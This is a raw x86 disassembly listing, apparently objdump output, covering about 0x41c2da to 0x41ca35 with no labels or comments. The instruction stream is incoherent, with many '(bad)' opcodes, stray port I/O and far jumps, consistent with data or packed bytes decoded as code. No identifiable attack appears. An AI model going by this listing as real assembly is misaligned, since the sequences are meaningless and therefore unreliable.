  41c2da:	icebp  
  41c2db:	lods   eax,DWORD PTR ds:[esi]
  41c2dc:	out    0xa3,eax
  41c2de:	or     eax,0x2847c374
  41c2e3:	popf   
  41c2e4:	sub    bl,BYTE PTR fs:[ebp+0x73b7838b]
  41c2eb:	jmp    0x41c319
  41c2ed:	aad    0x1c
  41c2ef:	fs leave 
  41c2f1:	leave  
  41c2f2:	xchg   ecx,eax
  41c2f3:	rcl    DWORD PTR [eax-0x87c98d0],0xf5
  41c2fa:	scas   eax,DWORD PTR es:[edi]
  41c2fb:	cmp    bl,BYTE PTR [ebx]
  41c2fd:	mov    ah,0xf8
  41c2ff:	push   edi
  41c300:	(bad)  
  41c301:	fsub   DWORD PTR [esi+0xc]
  41c304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c306:	(bad)  
  41c307:	cmp    eax,0x6ab6b3c1
  41c30c:	jno    0x41c2ca
  41c30e:	popa   
  41c30f:	mov    ebp,0x4374d1ea
  41c314:	(bad)  
  41c315:	jo     0x41c38e
  41c317:	xor    BYTE PTR [esi-0x387def48],cl
  41c31d:	fsub   DWORD PTR [eax]
  41c31f:	ror    BYTE PTR [edx+edx*4],1
  41c322:	scas   eax,DWORD PTR es:[edi]
  41c323:	retf   
  41c324:	fist   WORD PTR [ebx+eiz*8-0x498873c7]
  41c32b:	mov    edx,0xda563c22
  41c330:	push   ebx
  41c331:	push   ecx
  41c332:	fiadd  WORD PTR [edx+0x4388fed6]
  41c338:	mov    bl,0x1f
  41c33a:	jmp    0x4406:0x628074f6
  41c341:	(bad)  
  41c343:	and    al,0x12
  41c345:	hlt    
  41c346:	jmp    0xbef66faa
  41c34b:	sbb    dh,BYTE PTR [edx]
  41c34d:	call   0xb39741ba
  41c352:	inc    ecx
  41c353:	rcl    BYTE PTR [eax-0xa76d14d],0xc6
  41c35a:	push   eax
  41c35b:	jbe    0x41c3d3
  41c35d:	call   0xfb43b11a
  41c362:	xor    al,0xfa
  41c364:	jae    0x41c35a
  41c366:	std    
  41c367:	mov    dh,0xc8
  41c369:	push   ss
  41c36a:	test   DWORD PTR [esi+0x56],ebp
  41c36d:	or     BYTE PTR [edi+0x31],dh
  41c370:	std    
  41c371:	adc    al,0x1f
  41c373:	scas   al,BYTE PTR es:[edi]
  41c374:	pop    ds
  41c375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c376:	jg     0x41c3e3
  41c378:	mov    ch,BYTE PTR ds:[ecx]
  41c37b:	ja     0x41c3ee
  41c37d:	mov    al,ds:0x334af2b5
  41c382:	retf   
  41c383:	ins    DWORD PTR es:[edi],dx
  41c384:	mov    bh,0x7e
  41c386:	fucomi st,st(1)
  41c388:	ret    
  41c389:	or     ebx,esp
  41c38b:	push   ss
  41c38c:	test   BYTE PTR [edx-0x509aa186],ch
  41c392:	arpl   WORD PTR [esi+0x4ba42d4b],bx
  41c398:	or     BYTE PTR [ecx-0x2c6839fb],al
  41c39e:	mov    ebx,0x5110ccb8
  41c3a3:	xchg   edi,eax
  41c3a4:	leave  
  41c3a5:	push   edx
  41c3a6:	mov    bh,0x65
  41c3a8:	mov    eax,ds:0x785e6860
  41c3ad:	and    DWORD PTR ds:0x228ca027,edx
  41c3b3:	in     al,dx
  41c3b4:	sti    
  41c3b5:	ds popa 
  41c3b7:	dec    ecx
  41c3b8:	fidiv  DWORD PTR [edx+0x5c]
  41c3bb:	in     eax,dx
  41c3bc:	test   al,0xea
  41c3be:	ret    0xf0cf
  41c3c1:	jo     0x41c3d0
  41c3c3:	mov    edx,0xeb94b5
  41c3c8:	or     DWORD PTR [edx+0x44],eax
  41c3cb:	lods   eax,DWORD PTR ds:[esi]
  41c3cc:	jle    0x41c3c5
  41c3ce:	imul   esp,DWORD PTR [edx],0xbfc25c0d
  41c3d4:	xor    BYTE PTR [esi-0x60],dl
  41c3d7:	mov    ah,0xc5
  41c3d9:	cs ins DWORD PTR es:[edi],dx
  41c3db:	out    dx,al
  41c3dc:	push   ebx
  41c3dd:	call   0xf15d:0xbf6dba5e
  41c3e4:	mov    ah,0xc7
  41c3e6:	fs retf 0x5e5
  41c3ea:	jne    0x41c40a
  41c3ec:	push   ebp
  41c3ed:	aas    
  41c3ee:	js     0x41c467
  41c3f0:	sub    eax,0x827bb74e
  41c3f5:	dec    esi
  41c3f6:	div    dh
  41c3f8:	lods   al,BYTE PTR ds:[esi]
  41c3f9:	cwde   
  41c3fa:	ret    
  41c3fb:	out    0x6b,eax
  41c3fd:	aaa    
  41c3fe:	mov    eax,ds:0x95dad62c
  41c403:	mov    dl,0xaf
  41c405:	repz and eax,DWORD PTR [edx+0x60411051]
  41c40c:	push   esp
  41c40d:	pop    ds
  41c40e:	and    al,0x7c
  41c410:	and    BYTE PTR [edx],bh
  41c412:	ins    BYTE PTR es:[edi],dx
  41c413:	cmp    DWORD PTR [ecx],0xe7208f21
  41c419:	cmp    bl,bh
  41c41b:	mov    bh,0x6a
  41c41d:	push   eax
  41c41e:	in     al,0x90
  41c420:	sbb    DWORD PTR [ebx],ebx
  41c422:	cmc    
  41c423:	push   esi
  41c424:	repz xchg ebx,eax
  41c426:	push   ss
  41c427:	cmc    
  41c428:	(bad)  
  41c429:	fs push 0x7c6d19cc
  41c42f:	and    BYTE PTR fs:[esi],0x0
  41c433:	test   eax,0x77268900
  41c438:	test   al,0x56
  41c43a:	jle    0x41c40f
  41c43c:	adc    DWORD PTR [edi+0x46],eax
  41c43f:	icebp  
  41c440:	mov    dh,0x15
  41c442:	mov    esp,0xeb681a56
  41c447:	loopne 0x41c3d0
  41c449:	jb     0x41c407
  41c44b:	push   ebx
  41c44c:	in     eax,dx
  41c44d:	stos   DWORD PTR es:[edi],eax
  41c44e:	in     al,dx
  41c44f:	mov    edx,0x57b44d67
  41c454:	retf   0x1f5
  41c457:	shr    al,1
  41c459:	sbb    al,0x30
  41c45c:	adc    BYTE PTR [bx+di],cl
  41c45f:	pop    es
  41c460:	lds    esp,FWORD PTR [edx-0x3f91b821]
  41c466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c467:	cmp    ebx,ecx
  41c469:	jne    0x41c47c
  41c46b:	xor    eax,0xf57014da
  41c470:	scas   eax,DWORD PTR es:[edi]
  41c471:	fiadd  WORD PTR [edi-0x60]
  41c474:	mov    al,0x3e
  41c476:	in     eax,dx
  41c477:	push   esi
  41c478:	mov    ebx,0xcea638bf
  41c47d:	int3   
  41c47e:	dec    edi
  41c47f:	pop    edi
  41c480:	mul    BYTE PTR [edi-0x12]
  41c483:	or     eax,DWORD PTR [esi-0x5d]
  41c486:	push   ebp
  41c487:	imul   esi,DWORD PTR ds:0x3a627789,0xfffffff9
  41c48e:	mov    dl,0x5f
  41c490:	test   ebx,esi
  41c492:	mov    dh,0x4b
  41c494:	xchg   edx,eax
  41c495:	xlat   BYTE PTR ds:[ebx]
  41c496:	mov    ebp,0xcc6ceed1
  41c49b:	inc    ebx
  41c49c:	adc    eax,0x4aaf98bc
  41c4a1:	sub    al,0xfb
  41c4a3:	out    0xd6,al
  41c4a5:	sbb    dh,BYTE PTR ds:0x4fd95474
  41c4ab:	jl     0x41c498
  41c4ad:	xor    DWORD PTR [esi+0x5a2e82c0],0xffffffbc
  41c4b4:	push   ds
  41c4b5:	pop    ebp
  41c4b6:	scas   al,BYTE PTR es:[edi]
  41c4b7:	arpl   WORD PTR [edx+ecx*1+0x6697410c],bp
  41c4be:	xchg   DWORD PTR [esi-0x76],eax
  41c4c1:	stc    
  41c4c2:	outs   dx,DWORD PTR ds:[esi]
  41c4c3:	dec    eax
  41c4c4:	ror    cl,cl
  41c4c6:	pop    ss
  41c4c7:	shr    DWORD PTR [esi],1
  41c4c9:	mov    al,ds:0x38c447e8
  41c4ce:	fldl2e 
  41c4d0:	das    
  41c4d1:	adc    al,0xe1
  41c4d3:	dec    ecx
  41c4d4:	lahf   
  41c4d5:	pop    edx
  41c4d6:	pop    eax
  41c4d7:	jmp    0x2e1b:0x2ef7747c
  41c4de:	xchg   DWORD PTR [ebx+edi*4+0x72],ebp
  41c4e2:	mov    bl,0x8
  41c4e4:	jne    0x41c475
  41c4e6:	dec    eax
  41c4e7:	fwait
  41c4e8:	mov    WORD PTR [edi+eiz*2+0x1b178c3e],cs
  41c4ef:	xchg   ebx,eax
  41c4f0:	push   eax
  41c4f1:	pop    ebx
  41c4f2:	gs inc eax
  41c4f4:	ins    BYTE PTR es:[edi],dx
  41c4f5:	mov    eax,0x5cd1c2f9
  41c4fa:	repnz adc al,0xdb
  41c4fd:	and    cl,BYTE PTR [esp+edi*4-0xeea38df]
  41c504:	int    0xe5
  41c506:	fist   DWORD PTR [ebx+0x3fb80ee0]
  41c50c:	cld    
  41c50d:	mov    esi,0x12651e98
  41c512:	stos   BYTE PTR es:[edi],al
  41c513:	push   esi
  41c514:	(bad)  
  41c515:	dec    ecx
  41c516:	xlat   BYTE PTR ds:[ebx]
  41c517:	xor    al,0x61
  41c519:	int3   
  41c51a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c51b:	(bad)  
  41c51c:	xor    dl,bh
  41c51e:	fnsave [bp+di]
  41c521:	imul   eax,DWORD PTR [edi-0x2a],0xffffffc3
  41c525:	loop   0x41c516
  41c527:	es mov ecx,0xb03a702a
  41c52d:	xchg   edi,eax
  41c52e:	push   ss
  41c52f:	or     al,0x88
  41c531:	pushf  
  41c532:	xor    ebx,DWORD PTR [ebx]
  41c534:	imul   edx,DWORD PTR [edi+0x5acc6886],0xac60f082
  41c53e:	cdq    
  41c53f:	out    0xb9,eax
  41c541:	in     al,0xa
  41c543:	daa    
  41c544:	out    dx,al
  41c545:	lods   al,BYTE PTR ds:[esi]
  41c546:	push   ss
  41c547:	aad    0x94
  41c549:	or     edi,DWORD PTR [esi-0xd]
  41c54c:	jns    0x41c56a
  41c54e:	test   bl,0xc4
  41c551:	dec    esi
  41c552:	and    bl,bh
  41c554:	cmp    al,BYTE PTR ds:0x3ee6ae4d
  41c55a:	xchg   esp,eax
  41c55b:	mov    ah,0xc3
  41c55d:	in     al,0x74
  41c55f:	outs   dx,DWORD PTR ds:[esi]
  41c560:	push   ss
  41c561:	sbb    bh,BYTE PTR ds:0x82b3d4e9
  41c567:	js     0x41c557
  41c569:	cli    
  41c56a:	scas   eax,DWORD PTR es:[edi]
  41c56b:	ins    BYTE PTR es:[edi],dx
  41c56c:	(bad)
  41c56f:	call   FWORD PTR [eax-0x20bab2f3]
  41c575:	xlat   BYTE PTR ds:[ebx]
  41c576:	lds    eax,FWORD PTR [eax]
  41c578:	std    
  41c579:	xchg   esi,eax
  41c57a:	xor    dl,BYTE PTR [edi]
  41c57c:	push   ss
  41c57d:	push   esp
  41c57e:	mov    fs,ebp
  41c580:	stos   DWORD PTR es:[edi],eax
  41c581:	xor    eax,0xf97428f6
  41c586:	retf   
  41c587:	hlt    
  41c588:	cmp    BYTE PTR [edi+0x1387ee9b],al
  41c58e:	jmp    0x1fe6:0xc7384933
  41c595:	or     DWORD PTR [ebp-0x52],edx
  41c598:	inc    ebx
  41c599:	mov    cl,0x7b
  41c59b:	pop    ebp
  41c59c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c59d:	push   0xf9c0ad2e
  41c5a2:	push   0xe
  41c5a4:	ss and al,0xe0
  41c5a7:	push   ebp
  41c5a8:	out    dx,eax
  41c5a9:	pop    eax
  41c5aa:	retf   
  41c5ab:	addr16 mov ds:0xe53f,eax
  41c5af:	mov    eax,0x227c1da2
  41c5b4:	repnz mov esp,0xcd64728d
  41c5ba:	cmp    edx,esi
  41c5bc:	mov    esi,DWORD PTR [ecx+0x3427afbb]
  41c5c2:	test   eax,0x2be283e
  41c5c7:	(bad)  
  41c5c8:	fldcw  WORD PTR [edi-0x16ab324c]
  41c5ce:	stos   BYTE PTR es:[edi],al
  41c5cf:	mov    dh,0xa9
  41c5d1:	mov    ds:0xba1d3ecf,eax
  41c5d6:	mov    DWORD PTR [eax+0x4b],edx
  41c5d9:	mov    esp,DWORD PTR [edx+0x1ccabf16]
  41c5df:	sbb    al,0xc3
  41c5e1:	fstp   QWORD PTR [eax-0x6df32d58]
  41c5e7:	(bad)  
  41c5e8:	scas   al,BYTE PTR es:[edi]
  41c5e9:	nop
  41c5ea:	pusha  
  41c5eb:	xor    ecx,eax
  41c5ed:	out    0x32,al
  41c5ef:	test   eax,0x85506420
  41c5f4:	xor    DWORD PTR [edx+0x4af198ad],esi
  41c5fa:	test   eax,0x10816b9f
  41c5ff:	push   es
  41c600:	xchg   BYTE PTR [edx-0x21abb4fa],cl
  41c606:	inc    esi
  41c607:	frstor [ecx+0x83353e5]
  41c60d:	and    DWORD PTR [eax],eax
  41c60f:	pushf  
  41c610:	sub    al,0xf
  41c612:	aad    0x5
  41c614:	pushf  
  41c615:	ret    0x7dea
  41c618:	test   BYTE PTR [eax],0x32
  41c61b:	popa   
  41c61c:	push   0x32a5c3cb
  41c621:	das    
  41c622:	outs   dx,BYTE PTR ds:[esi]
  41c623:	jp     0x41c668
  41c625:	dec    eax
  41c626:	lods   eax,DWORD PTR ds:[esi]
  41c627:	cwde   
  41c628:	in     al,0x0
  41c62a:	fwait
  41c62b:	pop    esp
  41c62c:	data16 and al,0x6
  41c62f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c630:	call   0x5550:0x524145d7
  41c637:	stc    
  41c638:	aaa    
  41c639:	jb     0x41c63e
  41c63b:	add    al,0x69
  41c63d:	push   0xffffffb4
  41c63f:	int    0x54
  41c641:	sbb    ebx,DWORD PTR [edi+0x1f5e9291]
  41c647:	pop    ebx
  41c648:	and    BYTE PTR [eax],dh
  41c64a:	iret   
  41c64b:	pop    esi
  41c64c:	or     DWORD PTR [edi-0x21c71d95],ecx
  41c652:	popa   
  41c653:	mov    ds:0xd3354558,eax
  41c658:	pusha  
  41c659:	scas   eax,DWORD PTR es:[edi]
  41c65a:	mov    eax,0x9813d55a
  41c65f:	dec    ebx
  41c660:	les    edi,FWORD PTR [ecx-0x6a6d30d5]
  41c666:	mov    bh,0x4
  41c668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c669:	cwde   
  41c66a:	jecxz  0x41c684
  41c66c:	add    esi,DWORD PTR [edi+edi*2-0x11]
  41c670:	fidiv  WORD PTR [ecx+esi*8]
  41c673:	(bad)  
  41c674:	mov    ah,0xb9
  41c676:	push   cs
  41c677:	jge    0x41c671
  41c679:	jne    0x41c682
  41c67b:	jecxz  0x41c6dd
  41c67d:	lods   eax,DWORD PTR ds:[esi]
  41c67e:	pop    ds
  41c67f:	add    DWORD PTR [ecx+ebx*8-0x31],0x4d
  41c684:	xlat   BYTE PTR ds:[ebx]
  41c685:	outs   dx,DWORD PTR ds:[esi]
  41c686:	sub    edi,esi
  41c688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c689:	cld    
  41c68a:	mov    ds:0x80492a50,al
  41c68f:	shl    cl,1
  41c691:	xchg   ecx,eax
  41c692:	inc    esi
  41c693:	adc    al,0xa7
  41c695:	jmp    0x5df3:0xc848529e
  41c69c:	xor    ecx,ecx
  41c69e:	xor    al,0xfe
  41c6a0:	imul   ebx,DWORD PTR [ecx+eax*2],0x44
  41c6a4:	push   ds
  41c6a5:	adc    ecx,0xffffffd5
  41c6a8:	xchg   ebx,eax
  41c6a9:	jnp    0x41c71c
  41c6ab:	fadd   QWORD PTR [eax-0x74b9a682]
  41c6b1:	popf   
  41c6b2:	pop    ds
  41c6b3:	cld    
  41c6b4:	sub    BYTE PTR [ecx+0x75],bl
  41c6b7:	jne    0x41c738
  41c6b9:	cmp    edi,DWORD PTR [esi+0x1a57efe6]
  41c6bf:	add    BYTE PTR [eax+0x45e52b6b],0x1
  41c6c6:	mov    ah,0x64
  41c6c8:	xor    eax,0xab913bd8
  41c6cd:	fidivr WORD PTR [ebx-0x62]
  41c6d0:	mov    ebx,0x14da97d3
  41c6d5:	inc    edx
  41c6d6:	stc    
  41c6d7:	adc    al,0x7b
  41c6d9:	iret   
  41c6da:	mov    al,ds:0x4b121846
  41c6df:	dec    edi
  41c6e0:	cwde   
  41c6e1:	xor    edi,DWORD PTR [edx+0x46]
  41c6e4:	push   ds
  41c6e5:	out    0x83,al
  41c6e7:	or     eax,0xcc80b609
  41c6ec:	pop    ss
  41c6ed:	xor    BYTE PTR ds:0x655a014,0x38
  41c6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f5:	leave  
  41c6f6:	dec    edx
  41c6f7:	dec    edx
  41c6f8:	xchg   DWORD PTR [eax-0x4224ae66],ebx
  41c6fe:	and    DWORD PTR [ebp-0x7d],edi
  41c701:	stc    
  41c702:	push   ds
  41c703:	cwde   
  41c704:	test   DWORD PTR [esi],edi
  41c706:	mov    ah,0x5b
  41c708:	ins    BYTE PTR es:[edi],dx
  41c709:	sub    al,0x75
  41c70b:	lods   eax,DWORD PTR ds:[esi]
  41c70c:	mov    ah,0x52
  41c70e:	(bad)  
  41c70f:	push   ebp
  41c710:	imul   ebp,edi,0x14099f3c
  41c716:	xchg   ebp,eax
  41c717:	push   esi
  41c718:	loopne 0x41c6c1
  41c71a:	hlt    
  41c71b:	rcr    DWORD PTR [edx+0x7d8e31ce],1
  41c721:	js     0x41c701
  41c723:	xor    al,0x33
  41c725:	and    al,0x9e
  41c727:	xchg   esi,ecx
  41c729:	inc    ebp
  41c72a:	mov    esi,0xb5e81d26
  41c72f:	inc    edi
  41c730:	lds    eax,FWORD PTR [ebx-0x33]
  41c733:	imul   esp,DWORD PTR [eax+eiz*8+0x1cfc6c74],0x1fbe8a92
  41c73e:	lock dec ebx
  41c740:	or     eax,0xb41daf7a
  41c745:	outs   dx,DWORD PTR ds:[esi]
  41c746:	scas   al,BYTE PTR es:[edi]
  41c747:	fld    QWORD PTR [ebx-0x4e]
  41c74a:	jb     0x41c79d
  41c74c:	xor    DWORD PTR [ebx-0x36446f9c],edx
  41c752:	pop    esi
  41c753:	xor    DWORD PTR [edx+0x51],eax
  41c756:	add    al,ah
  41c758:	cwde   
  41c759:	cmp    eax,0x95ec6603
  41c75e:	dec    ecx
  41c75f:	in     eax,0xf6
  41c761:	inc    ebp
  41c762:	lock and eax,0x204acd2a
  41c768:	mov    bl,BYTE PTR [ebp+0x26]
  41c76b:	add    eax,0x5f2aed59
  41c770:	mov    ebx,0xe4b425aa
  41c775:	pop    ecx
  41c776:	pop    ss
  41c777:	pushf  
  41c778:	mov    ebx,0xab82e876
  41c77d:	call   0x5135474a
  41c782:	xlat   BYTE PTR ds:[ebx]
  41c783:	jg     0x41c7e4
  41c785:	hlt    
  41c786:	push   ds
  41c787:	pop    dx
  41c789:	pushf  
  41c78a:	adc    cl,ch
  41c78c:	enter  0xdda6,0x27
  41c790:	xor    ch,BYTE PTR [ebx+0x7dca473c]
  41c796:	jg     0x41c805
  41c798:	jne    0x41c7f3
  41c79a:	or     DWORD PTR [eax],esp
  41c79c:	jns    0x41c7d7
  41c79e:	jp     0x41c815
  41c7a0:	(bad)  
  41c7a1:	fistp  QWORD PTR [edx+esi*8+0x74]
  41c7a5:	mov    ebp,eax
  41c7a7:	dec    ebp
  41c7a8:	test   DWORD PTR [edx-0x259f5993],eax
  41c7ae:	fwait
  41c7af:	cdq    
  41c7b0:	sub    al,0xf2
  41c7b2:	push   esp
  41c7b3:	lahf   
  41c7b4:	jecxz  0x41c80d
  41c7b6:	int3   
  41c7b7:	fld    DWORD PTR [ebx]
  41c7b9:	mov    al,ds:0x3a4e7ee5
  41c7be:	lods   al,BYTE PTR ds:[esi]
  41c7bf:	jmp    0x41c7b9
  41c7c1:	and    bh,BYTE PTR [esi+0x1f]
  41c7c4:	lea    esi,[esi+0x5e]
  41c7c7:	sbb    al,0x21
  41c7c9:	aam    0x99
  41c7cb:	js     0x41c75c
  41c7cd:	scas   eax,DWORD PTR es:[edi]
  41c7ce:	push   ebx
  41c7cf:	mov    edx,0xb0cfad03
  41c7d4:	mov    ch,0xaf
  41c7d6:	and    eax,0x56fa717c
  41c7db:	in     eax,dx
  41c7dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7dd:	mov    edx,ds
  41c7df:	retf   0xca7
  41c7e2:	mov    ch,0xdf
  41c7e4:	jo     0x41c7a3
  41c7e6:	add    eax,0x6abc0db2
  41c7eb:	lods   al,BYTE PTR ds:[esi]
  41c7ec:	outs   dx,DWORD PTR ds:[esi]
  41c7ed:	sub    ch,BYTE PTR [ebp-0x47]
  41c7f0:	out    dx,eax
  41c7f1:	push   edx
  41c7f2:	loope  0x41c774
  41c7f4:	sub    DWORD PTR [ebp-0x19],esi
  41c7f7:	das    
  41c7f8:	adc    al,0xbd
  41c7fa:	fsub   st(0),st
  41c7fc:	fsubr  st,st(0)
  41c7fe:	sti    
  41c7ff:	cmp    DWORD PTR [ebx],ebx
  41c801:	out    0x1,al
  41c803:	test   edx,edi
  41c805:	repnz sub DWORD PTR [edi],ebx
  41c808:	push   0x6e
  41c80a:	loop   0x41c85b
  41c80c:	dec    ebx
  41c80d:	icebp  
  41c80e:	loopne 0x41c875
  41c810:	(bad)  
  41c811:	fiadd  WORD PTR [ecx+0x34]
  41c814:	call   0xb94730c7
  41c819:	dec    esi
  41c81a:	add    eax,0x93765eb7
  41c81f:	lahf   
  41c820:	lds    esp,FWORD PTR [ecx+0x5c]
  41c823:	outs   dx,BYTE PTR cs:[esi]
  41c825:	push   esi
  41c826:	lock cmp al,0x25
  41c829:	out    dx,al
  41c82a:	inc    DWORD PTR [ecx]
  41c82c:	mov    DWORD PTR [edi-0x15],esi
  41c82f:	xchg   BYTE PTR [ebp+0x25],bl
  41c832:	ja     0x41c7c2
  41c834:	push   cs
  41c835:	mov    eax,ds:0x6fec7ce5
  41c83a:	ss jle 0x41c7be
  41c83d:	inc    ebx
  41c83e:	outs   dx,BYTE PTR ds:[esi]
  41c83f:	xor    eax,0xf43287e5
  41c844:	stc    
  41c845:	psrad  mm5,QWORD PTR [ebp-0x3]
  41c849:	imul   esp,DWORD PTR [ebp-0x1c4bf5d1],0xdf5b6f8c
  41c853:	pop    eax
  41c854:	add    DWORD PTR [edi+0x4f],0xc710ac68
  41c85b:	pusha  
  41c85c:	out    dx,eax
  41c85d:	mov    ds:0x268eb3d4,al
  41c862:	dec    edi
  41c863:	sub    al,0x73
  41c865:	sahf   
  41c866:	stos   BYTE PTR es:[edi],al
  41c867:	xor    eax,0x23c07522
  41c86c:	inc    edx
  41c86d:	js     0x41c893
  41c86f:	retf   
  41c870:	mov    ah,0xf4
  41c872:	jmp    0x41c88a
  41c874:	call   0xb2c002fb
  41c879:	dec    eax
  41c87a:	xlat   BYTE PTR ds:[ebx]
  41c87b:	xchg   esi,eax
  41c87c:	outs   dx,BYTE PTR ds:[esi]
  41c87d:	stos   DWORD PTR es:[edi],eax
  41c87e:	mov    dh,0xa4
  41c880:	punpckldq mm0,DWORD PTR [ecx+0x35]
  41c884:	add    DWORD PTR gs:[ebx+0x19115a44],esp
  41c88b:	mov    ch,0x22
  41c88d:	inc    eax
  41c88e:	test   BYTE PTR [eax],cl
  41c890:	sbb    BYTE PTR [edx],ch
  41c892:	scas   al,BYTE PTR es:[edi]
  41c893:	pop    eax
  41c894:	clc    
  41c895:	rol    BYTE PTR [edi+esi*8+0x7c540a56],0x7a
  41c89d:	sbb    al,0x73
  41c89f:	das    
  41c8a0:	sbb    edx,DWORD PTR [eax+0x14c0af50]
  41c8a6:	mov    bl,0xf
  41c8a8:	paddsb mm0,QWORD PTR [ebx-0x2d]
  41c8ac:	ss ds pushf 
  41c8af:	push   cs
  41c8b0:	jmp    0xb8b096d7
  41c8b5:	sub    BYTE PTR [esi+0x64],al
  41c8b8:	dec    edx
  41c8b9:	repz jmp 0x10a6465b
  41c8bf:	cmp    ah,dl
  41c8c1:	pop    ebp
  41c8c2:	cmc    
  41c8c3:	cmp    dl,BYTE PTR [edx-0x192eb90b]
  41c8c9:	shr    dl,0x66
  41c8cc:	add    DWORD PTR [edx],esp
  41c8ce:	dec    esp
  41c8cf:	and    ch,bl
  41c8d1:	cmp    al,0xa1
  41c8d3:	xchg   edx,eax
  41c8d4:	inc    edi
  41c8d5:	xchg   edx,eax
  41c8d6:	std    
  41c8d7:	dec    eax
  41c8d8:	push   ds
  41c8d9:	lods   al,BYTE PTR ds:[esi]
  41c8da:	js     0x41c91f
  41c8dc:	dec    esp
  41c8dd:	mov    ds:0x2e1abb16,al
  41c8e2:	xor    ebx,DWORD PTR [eax-0x37a51adc]
  41c8e8:	fild   QWORD PTR ss:[esi+0x2d]
  41c8ec:	sub    edi,DWORD PTR [edx+edi*1+0x1e68be6a]
  41c8f3:	inc    eax
  41c8f4:	cmp    al,0x42
  41c8f6:	sub    ebp,ebp
  41c8f8:	sub    al,0x75
  41c8fa:	xchg   ebp,eax
  41c8fb:	adc    DWORD PTR [edi+ebx*1+0x6185c570],edx
  41c902:	push   ds
  41c903:	jecxz  0x41c8f6
  41c905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c906:	adc    BYTE PTR [esi-0x2ca84f82],al
  41c90c:	add    BYTE PTR [edi-0x63],cl
  41c90f:	stos   DWORD PTR es:[edi],eax
  41c910:	mov    edi,0x8c58ff9f
  41c915:	lock jnp 0x41c93f
  41c918:	inc    ebx
  41c919:	out    0x1c,al
  41c91b:	pop    edi
  41c91c:	push   0x30
  41c91e:	(bad)  
  41c91f:	fnstsw WORD PTR [ecx+0x6bd0e16e]
  41c925:	data16 jle 0x41c98a
  41c928:	imul   edi,esi,0xffffffd0
  41c92b:	push   edx
  41c92c:	call   0x1cfd5332
  41c931:	(bad)  
  41c932:	pusha  
  41c933:	iret   
  41c934:	or     BYTE PTR [eax+0x2190493b],ah
  41c93a:	jb     0x41c8d9
  41c93c:	fnsave [edi+ebx*2]
  41c93f:	sub    BYTE PTR [ecx+0x2f],ch
  41c942:	mov    BYTE PTR [ecx+esi*2+0x41d9c7aa],0xb4
  41c94a:	add    BYTE PTR [ecx-0x4f6c724a],dl
  41c950:	ja     0x41c8fa
  41c952:	jl     0x41c9bc
  41c954:	jns    0x41c927
  41c956:	mov    ds:0x3fce222c,eax
  41c95b:	mov    bl,0xe3
  41c95d:	and    ecx,esi
  41c95f:	mov    esp,0xcf2922eb
  41c964:	mov    ah,0xa7
  41c966:	push   0xfffffff6
  41c968:	and    al,0xe8
  41c96a:	jge    0x41c9cb
  41c96c:	inc    edx
  41c96d:	imul   edx,ebp,0x9ac2b44d
  41c973:	std    
  41c974:	xor    ah,BYTE PTR [ebp+0x5]
  41c977:	ds push ebx
  41c979:	nop
  41c97a:	sbb    ecx,edi
  41c97c:	mov    DWORD PTR [ebp+eiz*2+0x0],ebp
  41c980:	pop    edx
  41c981:	(bad)  
  41c982:	pop    eax
  41c983:	or     edi,DWORD PTR [edx+ebx*2-0x1749ae1b]
  41c98a:	jmp    0x41c9ba
  41c98c:	mov    edi,0xb78f2284
  41c991:	retf   
  41c992:	icebp  
  41c993:	adc    bh,BYTE PTR [edx]
  41c995:	hlt    
  41c996:	jo     0x41c9c5
  41c998:	jge    0x41ca15
  41c99a:	jl     0x41ca0a
  41c99c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c99d:	test   DWORD PTR [edx+0x46],ecx
  41c9a0:	(bad)
  41c9a3:	mov    al,ds:0xcef2565d
  41c9a8:	mov    ecx,esi
  41c9aa:	and    edi,DWORD PTR [edx-0x7519d673]
  41c9b0:	dec    edi
  41c9b1:	xor    al,ch
  41c9b3:	sbb    BYTE PTR [ecx+ebx*8-0x18],0x5a
  41c9b8:	jns    0x41ca31
  41c9ba:	cmp    al,0xe5
  41c9bc:	imul   ebp,DWORD PTR [ecx-0x6f],0x78a3234a
  41c9c3:	pop    es
  41c9c4:	lahf   
  41c9c5:	xchg   DWORD PTR [esi+0x2213a85c],ebp
  41c9cb:	and    ecx,DWORD PTR [ecx+0x3558dc17]
  41c9d1:	test   eax,0xad3e7912
  41c9d6:	pusha  
  41c9d7:	xor    al,0x95
  41c9d9:	ins    DWORD PTR es:[edi],dx
  41c9da:	stc    
  41c9db:	dec    esp
  41c9dc:	je     0x41c9f7
  41c9de:	push   0xfffffff6
  41c9e0:	pop    es
  41c9e1:	shl    BYTE PTR [edi-0x3ffb2a1b],cl
  41c9e7:	sub    DWORD PTR [eax+0x38],ebx
  41c9ea:	ror    DWORD PTR [edx],1
  41c9ec:	xlat   BYTE PTR ds:[ebx]
  41c9ed:	push   esp
  41c9ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9ef:	inc    esp
  41c9f0:	imul   BYTE PTR [ecx+0x743244a8]
  41c9f6:	nop
  41c9f7:	out    0xc7,eax
  41c9f9:	cmp    bl,0xed
  41c9fc:	mov    dl,0xb3
  41c9fe:	dec    edx
  41c9ff:	mov    dh,BYTE PTR [esi-0x6df395b5]
  41ca05:	adc    ch,BYTE PTR ds:0x9dd17a01
  41ca0b:	xchg   BYTE PTR [ebp+0x6a],bh
  41ca0e:	adc    al,0xa1
  41ca10:	or     BYTE PTR [esi+edi*2+0x3e2af10e],0x2
  41ca18:	add    eax,0x313ee8ad
  41ca1d:	mov    ebp,0x8e3cfef4
  41ca22:	les    ebp,FWORD PTR [esp+ebx*8+0x4ac6e034]
  41ca29:	xor    dl,0xed
  41ca2c:	outs   dx,DWORD PTR ds:[esi]
  41ca2d:	push   edi
  41ca2e:	pop    esp
  41ca2f:	mov    ds:0x42064bfe,al
  41ca34:	sti    
  41ca35:	mov    edi,DWORD PTR [ecx-0x69]
